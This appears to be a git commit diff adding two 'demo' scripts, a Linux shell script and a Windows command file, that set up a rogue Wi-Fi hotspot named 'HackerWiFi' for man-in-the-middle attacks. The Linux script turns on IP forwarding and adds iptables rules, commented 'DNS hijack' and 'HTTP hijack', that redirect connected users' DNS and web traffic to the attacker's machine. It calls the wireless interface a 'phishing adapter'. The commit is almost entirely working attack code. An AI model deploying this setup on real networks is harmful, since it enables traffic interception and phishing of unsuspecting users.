6d60ca7eef4420b16d4adb39986719958905c0b0
zhangjiachen <zhangjiachen@baidu.com>
2014-07-17 16:13:58 +0800

    add command

---
+++ demo/linux/nat.sh
@@ -0,0 +1,51 @@
+in_dev="wlan0"
+out_dev="eth0"
+
+#
+# return ip of device
+#
+getDevIp() {
+	ip -f inet addr show $1 2>/dev/null | grep -Po 'inet \K[\d.]+'
+}
+
+#
+# phishing adapter's ip
+#
+in_ip=$(getDevIp $in_dev)
+if [ ! $in_ip ]; then
+	echo "$in_dev has no ip address"
+	exit 0
+fi
+echo "IN: $in_ip @ $in_dev"
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+iptables -F -t nat
+
+# DNS hijack
+iptables -t nat -A PREROUTING -p udp -j DNAT --dport 53 --to-destination $in_ip -i $in_dev
+
+# HTTP hijack
+iptables -t nat -A PREROUTING -p tcp -j DNAT --dport 80 --to-destination $in_ip
+
+
+# network proxy
+if [ ! $out_dev ]; then
+	echo "offline mode"
+else
+	# proxy adapter's ip
+	out_ip=$(getDevIp $out_dev)
+	if [ ! $out_ip ]; then
+		echo "$out_dev has no ip address"
+		exit 0
+	fi
+
+	echo "OUT: $out_ip @ $out_dev"
+
+	iptables -t nat -A POSTROUTING -o $out_dev -j MASQUERADE
+fi
+
+echo "===================="
+
+iptables -L -t nat --line-numbers
---
+++ demo/win7/ap.cmd
@@ -0,0 +1,4 @@
+netsh wlan set hostednetwork mode=allow ssid=HackerWiFi key=12345678
+netsh wlan start hostednetwork
+
+pause
